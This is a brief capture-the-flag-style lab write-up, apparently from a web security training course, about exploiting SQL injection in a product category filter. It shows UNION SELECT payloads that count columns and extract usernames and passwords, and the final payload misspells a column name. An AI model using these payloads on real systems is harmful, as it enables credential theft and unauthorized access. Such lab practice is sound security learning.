# Lab 6: Retrieving Multiple Data via SQL Injection (Product Category Filter)

### What I Did to Solve This Lab

- Found a **SQL injection vulnerability** in the product category filter where I could inject SQL code.
- Used a **UNION SELECT** attack to retrieve data from another table called `users` which contains the columns `username` and `password`.
- First, I figured out how many columns the original query returned by testing:

```sql
  ' UNION SELECT NULL--+
  ' UNION SELECT NULL, NULL--+
  ' UNION SELECT NULL, NULL, NULL--+
```
Once I confirmed the number of columns (2 in this case), I extracted the usernames and passwords like this:

```sql
' UNION SELECT NULL, username || '~' || password FROM users--+
```

(Note: || is for PostgreSQL string concatenation; in MySQL use CONCAT())

Made sure to always end my injection payload with --+ to comment out the rest of the original query properly.

Looked at the output for the administrator’s credentials.

Logged in using the retrieved username and password and completed the lab.

## Solution: 

<img width="1296" height="599" alt="Screenshot (777)" src="https://github.com/user-attachments/assets/1a9bfc3c-50bd-4179-9d9c-37425e925832" />

```sql
' UNION SELECT NULL, username ||'~'||passwrord FROM users--+
```
